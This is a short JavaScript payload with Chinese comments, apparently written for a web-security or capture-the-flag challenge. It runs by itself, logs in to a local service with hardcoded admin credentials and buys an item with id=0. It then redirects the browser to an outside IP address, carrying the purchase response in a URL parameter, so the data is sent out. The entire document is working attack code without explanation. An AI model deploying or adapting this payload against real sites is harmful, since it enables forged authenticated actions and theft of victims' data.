!(function() {
            // 登录步骤
            fetch('http://127.0.0.1/login', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'username=admin3&password=12345678'
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Login failed');
                }
                return response.text();
            })
            .then(() => {
                // 购买商品步骤
                return fetch('http://127.0.0.1/buy', {
                    method: 'POST',
                    credentials: 'include',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: 'id=0' // 假设id=0是我们想要购买的商品
                });
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Buy operation failed');
                }
                return response.text();
            })
            .then(result => {
                // 使用购买结果构建URL并访问
                // 假设result是我们需要的数据，根据你的实际逻辑处理这个result
                const data = encodeURIComponent(result); // 假设我们需要对数据进行编码
                window.location.href = `http://120.26.103.53/para?data=${data}`;
            })
            .catch(error => {
                console.error(error);
            });
        })();
